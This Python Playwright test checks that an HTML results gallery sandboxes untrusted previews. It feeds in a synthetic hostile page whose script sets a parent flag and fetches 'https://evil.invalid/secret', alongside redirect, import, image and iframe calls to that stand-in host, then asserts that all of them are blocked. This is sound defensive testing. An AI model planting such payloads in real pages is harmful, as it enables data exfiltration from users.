"""Isolated fake-site UI test; no Harbor DB or Arena access. Requires Playwright Chromium."""
import asyncio,json,sys
from pathlib import Path
sys.path.insert(0,str(Path(__file__).resolve().parents[1]))
from html_results import preview_html
from playwright.async_api import async_playwright
SOURCE='''<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.invalid/leak"><style>@import url(https://evil.invalid/style);body{margin:0;background:#e8f3e8}svg{width:100%;height:240px}</style></head><body><script>parent.pwned=true;fetch('https://evil.invalid/secret');location='https://evil.invalid/nav'</script><img src="https://evil.invalid/image"><iframe src="https://evil.invalid/frame"></iframe><svg viewBox="0 0 300 200"><circle cy="100" r="30" fill="#26766b"><animate attributeName="cx" values="35;260;35" dur="2s" repeatCount="indefinite"/></circle></svg><a href="https://evil.invalid/link">link</a></body></html>'''
async def main():
 html=(Path(__file__).resolve().parents[1]/'browser_manager.html').read_text(encoding='utf-8-sig');Path('gallery-test-results').mkdir(exist_ok=True);safe=preview_html(SOURCE);errors=[];network=[]
 items=[dict(id=f'{i:032x}',saved_at='2026-01-01T00:00:00+00:00',source='synthetic',bytes=len(SOURCE),account_name=f'Demo {i}',account_email=f'demo{i}@example.invalid',environment_name='Synthetic environment',kind='pelican_quick',number=i,rating='pending',starred=False,note='',tags='') for i in range(1,101)]
 async with async_playwright() as p:
  browser=await p.chromium.launch();context=await browser.new_context(viewport={'width':1350,'height':960})
  async def handle(route):
   from urllib.parse import urlparse
   u=urlparse(route.request.url);network.append(route.request.url)
   if u.netloc!='harbor.test':await route.abort();return
   path=u.path
   if path=='/':await route.fulfill(content_type='text/html',body=html);return
   if path=='/api/environments':data={'environments':[],'max_running':6}
   elif path=='/api/accounts':data={'accounts':[]}
   elif path=='/api/logs':data={'logs':[]}
   elif path=='/api/html-results':data={'results':items,'total':100,'limit':100}
   elif path.endswith('/preview'):data={'html':safe}
   elif path.startswith('/api/records/'):
    rid=path.split('/')[3];r=next(r for r in items if r['id']==rid)
    data={**r,'created_at':r['saved_at'],'updated_at':r['saved_at'],'status':'success','url':'','payload':{'message':'synthetic test','turns':[]},'html_result':r,'analysis':None,'screenshot':''}
    if path.endswith('/review'):data.update(route.request.post_data_json)
   elif path=='/api/records':data={'records':[],'total':0,'page_size':30}
   else:await route.fulfill(status=404,body='missing');return
   await route.fulfill(content_type='application/json',body=json.dumps(data))
  await context.route('**/*',handle);page=await context.new_page();page.on('pageerror',lambda e:errors.append(str(e)))
  await page.goto('http://harbor.test/');await page.click('#nav-history');await page.locator('.html-card').first.wait_for();await page.wait_for_timeout(700)
  assert await page.locator('.html-card').count()==100
  loaded=await page.locator('#html-gallery iframe').evaluate_all('(xs)=>xs.filter(f=>f.srcdoc).length');assert 0<loaded<15,loaded
  assert all(f.get('sandbox')=='' for f in await page.locator('#html-gallery iframe').evaluate_all('(xs)=>xs.map(f=>({sandbox:f.getAttribute("sandbox")}))'))
  await page.screenshot(path='gallery-test-results/gallery.png',full_page=False)
  await page.locator('.html-card-open').first.click();await page.locator('#record-html iframe').wait_for();await page.wait_for_timeout(350)
  assert 'demo1@example.invalid' in await page.locator('#record-account').inner_text()
  frame=page.locator('#record-html iframe');cf=await (await frame.element_handle()).content_frame()
  x1=await cf.locator('circle').evaluate('(e)=>e.getBBox().x');await page.wait_for_timeout(400);x2=await cf.locator('circle').evaluate('(e)=>e.getBBox().x');assert abs(x1-x2)>5,(x1,x2)
  assert not await page.evaluate('window.pwned===true')
  assert not any('evil.invalid' in u for u in network),network
  await page.screenshot(path='gallery-test-results/detail.png')
  await page.fill('#review-note','Synthetic review');await page.click('#review-save');await page.wait_for_timeout(150)
  await page.click('#record-close');await page.locator('#record-html iframe').wait_for(state='detached')
  await page.select_option('#history-mode','records');assert await page.locator('#history-table-section').is_visible()
  await page.select_option('#history-mode','html');await page.wait_for_timeout(200);assert await page.locator('#html-gallery-section').is_visible()
  assert not errors,errors
  print(json.dumps({'cards':100,'loaded_frames_initial':loaded,'account_detail':'passed','review':'passed','svg_animation':'passed','scripts_and_network':'blocked','mode_switch':'passed','console_errors':errors}))
  await browser.close()
asyncio.run(main())
